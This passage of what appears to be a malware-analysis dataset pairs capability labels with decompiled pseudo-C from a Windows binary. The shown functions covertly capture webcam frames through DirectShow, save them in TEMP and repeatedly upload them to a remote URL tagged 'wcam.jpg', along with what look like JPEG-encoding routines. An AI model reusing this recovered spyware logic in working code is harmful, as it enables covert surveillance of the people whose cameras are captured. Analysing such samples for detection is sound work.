= puVar11 + 1;\n            } while (cVar3 != '\\0');\n            pcVar9 = puVar11 + (pcVar14 - (&var_3bch + 1));\n            iVar20 = fcn.004228ad(iVar20, pcVar9 + 1);\n            if (pcVar14 < pcVar9) {\n                iVar5 = pcVar14 - (&var_3bch + 1);\n                iVar17 = -pcVar14;\n                do {\n                    pcVar14[iVar20] = *(&var_3bch + pcVar14 + iVar17);\n                    pcVar14 = pcVar14 + 1;\n                } while (pcVar14 < puVar11 + iVar5);\n            }\n            pcVar9[iVar20] = '\\0';\n            iVar20 = fcn.004228ad(iVar20, pcVar9 + 2);\n            pcVar14 = pcVar9 + 1;\n            if (pcVar9 < pcVar14) {\n                iVar17 = 0x43e1ac - pcVar9;\n                do {\n                    pcVar9[iVar20] = pcVar9[iVar17];\n                    pcVar9 = pcVar9 + 1;\n                } while (pcVar9 < pcVar14);\n            }\n            pcVar14[iVar20] = '\\0';\n            iVar17 = (*_sym.imp.KERNEL32.DLL_Process32Next)();\n        }\n        (*_sym.imp.KERNEL32.DLL_CloseHandle)(iVar18);\n    }\n    pcVar15 = fcn.004228ad(iVar20, pcVar14 + 3);\n    pcVar9 = pcVar14 + 2;\n    if (pcVar14 < pcVar9) {\n        pcVar10 = pcVar14;\n        do {\n            pcVar15[pcVar10] = pcVar10[0x43e370 - pcVar14];\n            pcVar10 = pcVar10 + 1;\n        } while (pcVar10 < pcVar9);\n    }\n    pcVar15[pcVar9] = '\\0';\n    iVar20 = fcn.0041ff97(pcVar14 + 3);\n    pcVar14 = pcVar15;\n    do {\n        cVar3 = *pcVar14;\n        pcVar14[iVar20 - pcVar15] = cVar3;\n        pcVar14 = pcVar14 + 1;\n    } while (cVar3 != '\\0');\n    fcn.004214f1(pcVar15);\n    *in_FS_OFFSET = var_ch;\n    fcn.00420bc6(arg_8h_00);\n    return;\n}\n",
        "token_count": 4588
    },
    "0040cd20": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040cd20(int32_t arg_8h)\n\n{\n    uint arg_10h;\n    char cVar1;\n    uint uVar2;\n    char *pcVar3;\n    char *pcVar4;\n    char *pcVar5;\n    char *pcVar6;\n    char *pcVar7;\n    uint arg_8h_00;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint uStack28;\n    uint uStack24;\n    char *pcStack20;\n    uint uStack16;\n    int32_t iStack12;\n    \n    uVar2 = fcn.00420e6f(0);\n    fcn.00420c64(uVar2);\n    iStack12 = 0;\n    if (arg_8h != 0) {\n        iStack12 = arg_8h;\n    }\ncode_r0x0040cd52:\n    pcVar3 = fcn.004020c0();\n    pcVar4 = fcn.00420d1e(\"TEMP\");\n    pcVar6 = pcVar4 + 1;\n    do {\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    pcVar5 = pcVar3;\n    do {\n        cVar1 = *pcVar5;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar1 != '\\0');\n    pcVar6 = fcn.0041ff97(pcVar4 + pcVar5 + ((8 - (pcVar3 + 1)) - pcVar6));\n    pcStack20 = pcVar6;\n    uVar2 = fcn.00420d1e(\"TEMP\");\n    fcn.00420bd5(pcVar6, 0x43c26c, uVar2);\n    fcn.00420c59(pcVar3);\n    cVar1 = fcn.0040d450(pcVar6);\n    if (cVar1 != '\\0') {\n        pcVar3 = pcVar6;\n        do {\n            cVar1 = *pcVar3;\n            pcVar3 = pcVar3 + 1;\n        } while (cVar1 != '\\0');\n        uVar2 = fcn.0041ff97(pcVar3 + (8 - (pcVar6 + 1)));\n        fcn.00420bd5(uVar2, \"%s.cr\", pcVar6);\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        pcVar4 = *(*0x444b3c + 8);\n        pcVar3 = pcVar4 + 1;\n        do {\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar4 + 1;\n        } while (cVar1 != '\\0');\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        fcn.00406000(uVar2, *(*0x444b3c + 8), pcVar4 - pcVar3);\n        fcn.004227e9(pcVar6);\n        uStack16 = fcn.004015f0();\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        pcVar4 = *(*0x444b3c + 0x94);\n        pcVar3 = pcVar4 + 1;\n        do {\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar4 + 1;\n        } while (cVar1 != '\\0');\n        pcVar7 = fcn.00405f40();\n        pcVar5 = pcVar7 + 1;\n        do {\n            cVar1 = *pcVar7;\n            pcVar7 = pcVar7 + 1;\n        } while (cVar1 != '\\0');\n        arg_8h_00 = fcn.0041ff97(pcVar4 + pcVar7 + ((0x40 - pcVar5) - pcVar3));\n        if (*0x444a85 == '\\0') {\n            fcn.004060f0();\n            *0x444a85 = '\\x01';\n        }\n        arg_10h = *(*0x444b3c + 0x94);\n        fcn.00405f40();\n        fcn.00420bd5(arg_8h_00, \"%s?enc&comp=%s&ext=wcam.jpg\", arg_10h);\n        do {\n            iVar8 = (*_sym.imp.SHLWAPI.dll_PathFileExistsA)(uVar2);\n            if (iVar8 != 0) {\n                uStack24 = 0;\n                iVar8 = fcn.00401db0(uVar2);\n                pcVar6 = pcStack20;\n                if (iVar8 != 0) {\n                    iVar10 = 0;\n                    uStack28 = 0;\n                    iVar9 = (*_sym.imp.WININET.dll_InternetGetConnectedState)(&uStack28, 0);\n                    if (iVar9 != 0) {\n                        iVar10 = fcn.004046c0(iVar8, uStack24, &uStack28);\n                    }\n                    fcn.00420c59(iVar8);\n                    pcVar6 = pcStack20;\n                    if (iVar10 != 0) goto code_r0x0040cf7c;\n                }\n            }\n            iVar8 = (*_sym.imp.SHLWAPI.dll_PathFileExistsA)(uVar2);\n            if (iVar8 == 0) goto code_r0x0040cf7c;\n            (*_sym.imp.KERNEL32.DLL_Sleep)(30000);\n        } while( true );\n    }\n    uVar2 = 30000;\n    goto code_r0x0040cfb4;\ncode_r0x0040cf7c:\n    fcn.00420c59(uStack16);\n    fcn.00420c59(arg_8h_00);\n    fcn.004227e9(uVar2);\n    fcn.00420c59(uVar2);\n    uVar2 = 300000;\ncode_r0x0040cfb4:\n    (*_sym.imp.KERNEL32.DLL_Sleep)(uVar2);\n    fcn.00420c59(pcVar6);\n    if (iStack12 != 0) {\n        return 0;\n    }\n    goto code_r0x0040cd52;\n}\n",
        "token_count": 1459
    },
    "0040d050": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040d050(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t in_ECX;\n    uchar *puVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t iVar11;\n    uchar *puVar12;\n    bool bVar13;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (((arg_8h != 0) && (in_ECX != 0)) && (in_EAX != 0)) {\n        uVar2 = in_ECX * 3;\n        iVar3 = 0;\n        uVar7 = uVar2 & 0x80000003;\n        bVar13 = uVar7 == 0;\n        uVar8 = uVar2;\n        if (uVar7 < 0) {\n            bVar13 = (uVar7 - 1 | 0xfffffffc) == 0xffffffff;\n        }\n        while (!bVar13) {\n            uVar8 = uVar8 + 1;\n            iVar3 = iVar3 + 1;\n            uVar7 = uVar8 & 0x80000003;\n            bVar13 = uVar7 == 0;\n            if (uVar7 < 0) {\n                bVar13 = (uVar7 - 1 | 0xfffffffc) == 0xffffffff;\n            }\n        }\n        iVar4 = fcn.0041ff97(in_ECX * in_EAX * 3);\n        iVar5 = in_EAX + -1;\n        if (-1 < iVar5) {\n            var_8h = iVar5 * in_ECX * 3;\n            iVar11 = ((in_EAX - iVar5) + -1) * (uVar2 + iVar3);\n            do {\n                if (0 < uVar2) {\n                    iVar1 = arg_8h + 1;\n                    iVar9 = iVar4 + 1;\n                    puVar12 = iVar11 + iVar1;\n                    puVar6 = var_8h + iVar9;\n                    iVar10 = (uVar2 - 1) / 3 + 1;\n                    do {\n                        puVar6[iVar4 - iVar9] = puVar12[(arg_8h - iVar1) + 2];\n                        *puVar6 = *puVar12;\n                        puVar6[(iVar4 - iVar9) + 2] = puVar12[arg_8h - iVar1];\n                        puVar6 = puVar6 + 3;\n                        puVar12 = puVar12 + 3;\n                        iVar10 = iVar10 + -1;\n                    } while (iVar10 != 0);\n                }\n                iVar11 = iVar11 + uVar2 + iVar3;\n                var_8h = var_8h + in_ECX * -3;\n                iVar5 = iVar5 + -1;\n            } while (-1 < iVar5);\n        }\n        return iVar4;\n    }\n    return 0;\n}\n",
        "token_count": 761
    },
    "0040d450": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d450(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint arg_8h_00;\n    uint unaff_ESI;\n    int32_t iVar4;\n    uint pvargDest;\n    uint var_60h;\n    int32_t var_5ch;\n    int32_t var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_28h;\n    int32_t *var_18h;\n    uint32_t var_14h;\n    int32_t pv;\n    uint32_t var_8h;\n    \n    var_8h = *0x441480 ^ &stack0xfffffffc;\n    var_60h = arg_8h;\n    *0x444a7c = 0;\n    *0x444a94 = NULL;\n    *0x444a98 = NULL;\n    *0x444a9c = NULL;\n    *0x444aa0 = NULL;\n    *0x444aa4 = NULL;\n    *0x444aa8 = NULL;\n    *0x444aac = 0;\n    *0x444ab0 = NULL;\n    *0x444ab4 = NULL;\n    *0x444ab8 = 0;\n    *0x444abc = NULL;\n    *0x444a7c = (*_sym.imp.ole32.dll_CoInitializeEx)(0, 0);\n    pcVar1 = _sym.imp.ole32.dll_CoCreateInstance;\n    if ((((*0x444a7c == 0) &&\n         (*0x444a7c = (*_sym.imp.ole32.dll_CoCreateInstance)(0x43c1fc, 0, 1, 0x43e484, 0x444aa4),  *0x444a7c == 0)) &&\n        (*0x444a7c = (*pcVar1)(0x43c1ec, 0, 1, 0x43c25c, 0x444aa8),  *0x444a7c == 0)) &&\n       (((*0x444a7c = (**(**0x444aa8 + 0xc))(*0x444aa8, *0x444aa4),  *0x444a7c == 0 &&\n         (*0x444a7c = (*pcVar1)(0x43c20c, 0, 1, 0x43e520, 0x444a94),  *0x444a7c == 0)) &&\n        (*0x444a7c = (**(**0x444a94 + 0xc))(*0x444a94, 0x43c21c, 0x444a98, 0),  *0x444a7c == 0)))) {\n        iVar4 = 0;\n        *0x444a7c = (**(**0x444a98 + 0xc))(*0x444a98, 1, 0x444a9c, 0);\n        while (*0x444a7c == 0) {\n            iVar4 = iVar4 + 1;\n            if (0 < iVar4) {\n                *0x444a7c = (**(**0x444a9c + 0x24))(*0x444a9c, 0, 0, 0x43e510, 0x444aa0);\n                (*_sym.imp.OLEAUT32.dll_VariantClear)(&pvargDest);\n                *0x444a7c = (**(**0x444aa0 + 0xc))(*0x444aa0, L\"FriendlyName\", &pvargDest, 0);\n                (*_sym.imp.OLEAUT32.dll_VariantCopy)(&pvargDest);\n                *0x444a7c = (**(**0x444a9c + 0x20))(*0x444a9c, 0, 0, 0x43e494, 0x444aac);\n                if (((*0x444a7c == 0) &&\n                    (*0x444a7c = (**(**0x444aa4 + 0xc))(*0x444aa4, *0x444aac, L\"Capture Filter\"),  *0x444a7c == 0)) &&\n                   ((*0x444a7c = (*pcVar1)(0x43e464, 0, 1, 0x43e494, 0x444ab0),  *0x444a7c == 0 &&\n                    ((*0x444a7c = (****0x444ab0)(*0x444ab0, 0x43e454, 0x444ab4),  *0x444a7c == 0 &&\n                     (*0x444a7c = (**(**0x444ab4 + 0x18))(*0x444ab4, 1),  *0x444a7c == 0)))))) {\n                    fcn.00429890(&var_54h, 0, 0x48);\n                    var_50h = *0x43c1d0;\n                    var_54h = str.vids._0_4_;\n                    var_4ch = *0x43c1d4;\n                    var_44h = *0x43c1dc;\n                    var_48h = *0x43c1d8;\n                    var_40h = *0x43c1e0;\n                    var_38h = *0x43c1e8;\n                    var_3ch = *0x43c1e4;\n                    *0x444a7c = (**(**0x444ab4 + 0x10))(*0x444ab4, &var_54h);\n                    if ((*0x444a7c == 0) &&\n                       ((((*0x444a7c = (**(**0x444aa4 + 0xc))(*0x444aa4, *0x444ab0, L\"SampleGrab\"),  *0x444a7c == 0 &&\n                          (*0x444a7c = (*pcVar1)(0x43e474, 0, 1, 0x43e494, 0x444ab8),  *0x444a7c == 0)) &&\n                         (*0x444a7c = (**(**0x444aa4 + 0xc))(*0x444aa4, *0x444ab8, L\"NullRender\"),  *0x444a7c == 0)) &&\n                        ((*0x444a7c = (**(**0x444aa8 + 0x1c))\n                                                (*0x444aa8, 0x43c23c, \"vids\", *0x444aac, *0x444ab0, *0x444ab8), \n                         *0x444a7c == 0 && (*0x444a7c = (****0x444aa4)(*0x444aa4, 0x43c24c, 0x444abc),  *0x444a7c == 0))\n                        )))) goto code_r0x0040d802;\n                }\n                break;\n            }\n            *0x444a7c = (**(**0x444a98 + 0xc))(*0x444a98, 1, 0x444a9c, 0);\n        }\n    }\n    goto code_r0x0040d5b4;\n    while (*0x444a7c == 1) {\ncode_r0x0040d802:\n        *0x444a7c = (**(**0x444abc + 0x1c))(*0x444abc);\n        if (*0x444a7c == 0) {\n            var_58h = 0;\n            goto code_r0x0040d825;\n        }\n    }\n    goto code_r0x0040d5b4;\n    while (*0x444a7c == -0x7ffbfdd9) {\ncode_r0x0040d825:\n        *0x444a7c = (**(**0x444ab4 + 0x1c))(*0x444ab4, &var_58h, 0);\n        if (*0x444a7c == 0) {\n            if (var_58h != 0) {\n                (**(**0x444abc + 0x24))(*0x444abc);\n                iVar4 = fcn.0041ff97(var_58h);\n                var_5ch = iVar4;\n                if (((iVar4 != 0) && (*0x444a7c = (**(**0x444ab4 + 0x1c))(*0x444ab4, &var_58h, iVar4),  *0x444a7c == 0))\n                   && ((*0x444a7c = (**(**0x444ab4 + 0x14))(*0x444ab4, &var_54h),  *0x444a7c == 0 &&\n                       (((iVar3 = fcn.0040cfe0(),  iVar2 = pv,  iVar3 != 0 && (0x57 < var_14h)) && (pv != 0)))))) {\n                    arg_8h_00 = fcn.0040d050(iVar4);\n                    fcn.0040d1a0(arg_8h_00, *(iVar2 + 0x38), *(iVar2 + 0x34));\n                    fcn.00420c59(arg_8h_00);\n                    if (var_14h != 0) {\n                        (*_sym.imp.ole32.dll_CoTaskMemFree)(pv);\n                        var_14h = 0;\n                        pv = 0;\n                    }\n                    if (var_18h != NULL) {\n                        (**(*var_18h + 8))(var_18h);\n                        var_18h = NULL;\n                    }\n                    fcn.00420c59(var_5ch);\n                    fcn.0040d380();\n                    fcn.00420bc6(unaff_ESI);\n                    return;\n                }\n                break;\n            }\n            goto code_r0x0040d825;\n        }\n    }\ncode_r0x0040d5b4:\n    fcn.0040d380();\n    fcn.00420bc6(unaff_ESI);\n    return;\n}\n",
        "token_count": 2350
    },
    "0040d960": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040d960(int32_t param_1, int32_t param_2, char param_3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t unaff_EBX;\n    int32_t *piVar3;\n    int32_t *unaff_EDI;\n    \n    if (unaff_EDI[5] != 100) {\n        *(*unaff_EDI + 0x14) = 0x15;\n        *(*unaff_EDI + 0x18) = unaff_EDI[5];\n        (***unaff_EDI)();\n    }\n    if ((unaff_EBX < 0) || (3 < unaff_EBX)) {\n        *(*unaff_EDI + 0x14) = 0x20;\n        *(*unaff_EDI + 0x18) = unaff_EBX;\n        (***unaff_EDI)();\n    }\n    if (unaff_EDI[unaff_EBX + 0x16] == 0) {\n        iVar1 = (**unaff_EDI[1])();\n        *(iVar1 + 0x80) = 0;\n        unaff_EDI[unaff_EBX + 0x16] = iVar1;\n    }\n    iVar1 = 0;\n    piVar3 = param_1 + 8;\n    do {\n        iVar2 = (piVar3[-2] * param_2 + 0x32) / 100;\n        if (iVar2 < 1) {\n            iVar2 = 1;\n        }\n        else if (0x7fff < iVar2) {\n            iVar2 = 0x7fff;\n        }\n        if ((param_3 != '\\0') && (0xff < iVar2)) {\n            iVar2 = 0xff;\n        }\n        *(iVar1 + unaff_EDI[unaff_EBX + 0x16]) = iVar2;\n        iVar2 = (piVar3[-1] * param_2 + 0x32) / 100;\n        if (iVar2 < 1) {\n            iVar2 = 1;\n        }\n        else if (0x7fff < iVar2) {\n            iVar2 = 0x7fff;\n        }\n        if ((param_3 != '\\0') && (0xff < iVar2)) {\n            iVar2 = 0xff;\n        }\n        *(unaff_EDI[unaff_EBX + 0x16] + 2 + iVar1) = iVar2;\n        iVar2 = (*piVar3 * param_2 + 0x32) / 100;\n        if (iVar2 < 1) {\n            iVar2 = 1;\n        }\n        else if (0x7fff < iVar2) {\n            iVar2 = 0x7fff;\n        }\n        if ((param_3 != '\\0') && (0xff < iVar2)) {\n            iVar2 = 0xff;\n        }\n        *(unaff_EDI[unaff_EBX + 0x16] + 4 + iVar1) = iVar2;\n        iVar2 = (piVar3[1] * param_2 + 0x32) / 100;\n        if (iVar2 < 1) {\n            iVar2 = 1;\n        }\n        else if (0x7fff < iVar2) {\n            iVar2 = 0x7fff;\n        }\n        if ((param_3 != '\\0') && (0xff < iVar2)) {\n            iVar2 = 0xff;\n        }\n        *(iVar1 + 6 + unaff_EDI[unaff_EBX + 0x16]) = iVar2;\n        iVar1 = iVar1 + 8;\n        piVar3 = piVar3 + 4;\n    } while (iVar1 < 0x80);\n    *(unaff_EDI[unaff_EBX + 0x16] + 0x80) = 0;\n    return;\n}\n",
        "token_count": 857
    },
    "0040dba0": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040dba0(int32_t *param_1, int32_t *param_2, uint param_3)\n\n{\n    uint *puVar1;\n    uint *in_EAX;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    \n    if (*param_2 == 0) {\n        iVar2 = (**param_1[1])(param_1, 0, 0x112);\n        *(iVar2 + 0x111) = 0;\n        *param_2 = iVar2;\n    }\n    puVar1 = *param_2;\n    *puVar1 = *in_EAX;\n    puVar1[1] = in_EAX[1];\n    puVar1[2] = in_EAX[2];\n    puVar1[3] = in_EAX[3];\n    *(puVar1 + 4) = *(in_EAX + 4);\n    iVar7 = 0;\n    iVar6 = 0;\n    iVar5 = 0;\n    puVar3 = in_EAX + 2;\n    iVar4 = 0;\n    iVar2 = 4;\n    do {\n        iVar7 = iVar7 + puVar3[-1];\n        iVar4 = iVar4 + *puVar3;\n        iVar5 = iVar5 + puVar3[1];\n        iVar6 = iVar6 + puVar3[2];\n        puVar3 = puVar3 + 4;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    iVar7 = iVar7 + iVar6 + iVar5 + iVar4;\n    if ((iVar7 < 1) || (0x100 < iVar7)) {\n        *(*param_1 + 0x14) = 9;\n        (***param_1)(param_1);\n    }\n    fcn.00423e20(*param_2 + 0x11, param_3, iVar7);\n    *(*param_2 + 0x111) = 0;\n    return;\n}\n",
        "token_count": 470
    },
    "0040dc70": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040e397)\n\nvoid fcn.0040dc70(void)\n\n{\n    uint *puVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    \n    if (in_EAX[5] != 100) {\n        *(*in_EAX + 0x14) = 0x15;\n        *(*in_EAX + 0x18) = in_EAX[5];\n        (***in_EAX)();\n    }\n    if (in_EAX[0x15] == 0) {\n        iVar2 = (**in_EAX[1])();\n        in_EAX[0x15] = iVar2;\n    }\n    in_EAX[0xe] = 1;\n    in_EAX[0xf] = 1;\n    in_EAX[0x12] = 8;\n    fcn.0040d960(0x43d390, 0x32, 1);\n    fcn.0040d960(0x43d490, 0x32, 1);\n    fcn.0040dba0();\n    fcn.0040dba0();\n    fcn.0040dba0();\n    fcn.0040dba0();\n    iVar2 = 0x10;\n    piVar3 = in_EAX + 0x2a;\n    do {\n        *(piVar3 + -4) = 0;\n        *piVar3 = 1;\n        *(piVar3 + 4) = 5;\n        piVar3 = piVar3 + 1;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    in_EAX[0x33] = 0;\n    in_EAX[0x32] = 0;\n    *(in_EAX + 0x34) = 0;\n    *(in_EAX + 0xd2) = 0;\n    if (8 < in_EAX[0x12]) {\n        *(in_EAX + 0xd2) = 1;\n    }\n    in_EAX[0x36] = 0;\n    in_EAX[0x37] = 0;\n    in_EAX[0x38] = 0;\n    in_EAX[0x39] = 0;\n    *(in_EAX + 0xeb) = 0;\n    *(in_EAX + 0xd3) = 0x100;\n    *(in_EAX + 0xe9) = 0x101;\n    *(in_EAX + 0x3b) = 1;\n    *(in_EAX + 0xee) = 1;\n    // switch table (6 cases) at 0x40e098\n    switch(in_EAX[10]) {\n    case 0:\n        if (in_EAX[5] != 100) {\n            *(*in_EAX + 0x14) = 0x15;\n            *(*in_EAX + 0x18) = in_EAX[5];\n            (***in_EAX)();\n        }\n        in_EAX[0x14] = 0;\n        *(in_EAX + 0x3a) = 0;\n        *(in_EAX + 0x3c) = 0;\n    // WARNING: Could not recover jumptable at 0x0040e0f2. Too many branches\n    // WARNING: Treating indirect jump as call\n    // switch table (6 cases) at 0x40e3b0\n        (**0x40e3b0)();\n        return;\n    case 1:\n        if (in_EAX[5] != 100) {\n            *(*in_EAX + 0x14) = 0x15;\n            *(*in_EAX + 0x18) = in_EAX[5];\n            (***in_EAX)();\n        }\n        in_EAX[0x14] = 1;\n        *(in_EAX + 0x3a) = 1;\n        in_EAX[0x13] = 1;\n        *(in_EAX + 0x3c) = 0;\n        puVar1 = in_EAX[0x15];\n        *puVar1 = 1;\n        puVar1[2] = 1;\n        puVar1[3] = 1;\n        puVar1[4] = 0;\n        puVar1[5] = 0;\n        puVar1[6] = 0;\n        return;\n    case 2:\n        if (in_EAX[5] != 100) {\n            *(*in_EAX + 0x14) = 0x15;\n            *(*in_EAX + 0x18) = in_EAX[5];\n            (***in_EAX)();\n        }\n        break;\n    case 3:\n        if (in_EAX[5] != 100) {\n            *(*in_EAX + 0x14) = 0x15;\n            *(*in_EAX + 0x18) = in_EAX[5];\n            (***in_EAX)();\n        }\n        break;\n    case 4:\n        if (in_EAX[5] != 100) {\n            *(*in_EAX + 0x14) = 0x15;\n            *(*in_EAX + 0x18) = in_EAX[5];\n            (***in_EAX)();\n        }\n        puVar1 = in_EAX[0x15];\n        *(in_EAX + 0x3a) = 0;\n        *(in_EAX + 0x3c) = 1;\n        in_EAX[0x14] = 4;\n        in_EAX[0x13] = 4;\n        *puVar1 = 0x43;\n        puVar1[2] = 1;\n        puVar1[3] = 1;\n        puVar1[4] = 0;\n        puVar1[5] = 0;\n        puVar1[6] = 0;\n        iVar2 = in_EAX[0x15];\n        *(iVar2 + 0x58) = 0x4d;\n        *(iVar2 + 0x60) = 1;\n        *(iVar2 + 100) = 1;\n        *(iVar2 + 0x68) = 0;\n        *(iVar2 + 0x6c) = 0;\n        *(iVar2 + 0x70) = 0;\n        iVar2 = in_EAX[0x15];\n        *(iVar2 + 0xb0) = 0x59;\n        *(iVar2 + 0xb8) = 1;\n        *(iVar2 + 0xbc) = 1;\n        *(iVar2 + 0xc0) = 0;\n        *(iVar2 + 0xc4) = 0;\n        *(iVar2 + 200) = 0;\n        iVar2 = in_EAX[0x15];\n        *(iVar2 + 0x108) = 0x4b;\n        *(iVar2 + 0x110) = 1;\n        *(iVar2 + 0x114) = 1;\n        goto code_r0x0040dfa9;\n    case 5:\n        if (in_EAX[5] != 100) {\n            *(*in_EAX + 0x14) = 0x15;\n            *(*in_EAX + 0x18) = in_EAX[5];\n            (***in_EAX)();\n        }\n        puVar1 = in_EAX[0x15];\n        in_EAX[0x14] = 5;\n        *(in_EAX + 0x3c) = 1;\n        *(in_EAX + 0x3a) = 0;\n        in_EAX[0x13] = 4;\n        *puVar1 = 1;\n        puVar1[2] = 2;\n        puVar1[3] = 2;\n        puVar1[4] = 0;\n        puVar1[5] = 0;\n        puVar1[6] = 0;\n        iVar2 = in_EAX[0x15];\n        *(iVar2 + 0x58) = 2;\n        *(iVar2 + 0x60) = 1;\n        *(iVar2 + 100) = 1;\n        *(iVar2 + 0x68) = 1;\n        *(iVar2 + 0x6c) = 1;\n        *(iVar2 + 0x70) = 1;\n        iVar2 = in_EAX[0x15];\n        *(iVar2 + 0xb0) = 3;\n        *(iVar2 + 0xb8) = 1;\n        *(iVar2 + 0xbc) = 1;\n        *(iVar2 + 0xc0) = 1;\n        *(iVar2 + 0xc4) = 1;\n        *(iVar2 + 200) = 1;\n        iVar2 = in_EAX[0x15];\n        *(iVar2 + 0x108) = 4;\n        *(iVar2 + 0x110) = 2;\n        *(iVar2 + 0x114) = 2;\ncode_r0x0040dfa9:\n        *(iVar2 + 0x118) = 0;\n        *(iVar2 + 0x11c) = 0;\n        *(iVar2 + 0x120) = 0;\n        return;\n    default:\n        *(*in_EAX + 0x14) = 10;\n        (***in_EAX)();\n        return;\n    }\n    puVar1 = in_EAX[0x15];\n    *(in_EAX + 0x3a) = 1;\n    *(in_EAX + 0x3c) = 0;\n    in_EAX[0x14] = 3;\n    in_EAX[0x13] = 3;\n    *puVar1 = 1;\n    puVar1[2] = 2;\n    puVar1[3] = 2;\n    puVar1[4] = 0;\n    puVar1[5] = 0;\n    puVar1[6] = 0;\n    iVar2 = in_EAX[0x15];\n    *(iVar2 + 0x58) = 2;\n    *(iVar2 + 0x60) = 1;\n    *(iVar2 + 100) = 1;\n    *(iVar2 + 0x68) = 1;\n    *(iVar2 + 0x6c) = 1;\n    *(iVar2 + 0x70) = 1;\n    iVar2 = in_EAX[0x15];\n    *(iVar2 + 0xb0) = 3;\n    *(iVar2 + 0xb8) = 1;\n    *(iVar2 + 0xbc) = 1;\n    *(iVar2 + 0xc0) = 1;\n    *(iVar2 + 0xc4) = 1;\n    *(iVar2 + 200) = 1;\n    return;\n}\n",
        "token_count": 2438
    },
    "0040e500": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0040e500(void)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    code *pcVar3;\n    int32_t *unaff_ESI;\n    uint32_t uVar4;\n    \n    iVar1 = unaff_ESI[5];\n    if ((iVar1 == 0x65) || (iVar1 == 0x66)) {\n        if (unaff_ESI[0x3d] < unaff_ESI[8]) {\n            *(*unaff_ESI + 0x14) = 0x45;\n            (***unaff_ESI)();\n        }\n        pcVar3 = *(unaff_ESI[0x5d] + 8);\n    }\n    else {\n        if (iVar1 == 0x67) goto code_r0x0040e556;\n        *(*unaff_ESI + 0x14) = 0x15;\n        *(*unaff_ESI + 0x18) = unaff_ESI[5];\n        pcVar3 = **unaff_ESI;\n    }\n    (*pcVar3)();\ncode_r0x0040e556:\n    cVar2 = *(unaff_ESI[0x5d] + 0xd);\n    while (cVar2 == '\\0') {\n        (**unaff_ESI[0x5d])();\n        uVar4 = 0;\n        if (unaff_ESI[0x43] != 0) {\n            do {\n                if (unaff_ESI[2] != 0) {\n                    *(unaff_ESI[2] + 4) = uVar4;\n                    *(unaff_ESI[2] + 8) = unaff_ESI[0x43];\n                    (**unaff_ESI[2])();\n                }\n                cVar2 = (**(unaff_ESI[0x60] + 4))();\n                if (cVar2 == '\\0') {\n                    *(*unaff_ESI + 0x14) = 0x19;\n                    (***unaff_ESI)();\n                }\n                uVar4 = uVar4 + 1;\n            } while (uVar4 < unaff_ESI[0x43]);\n        }\n        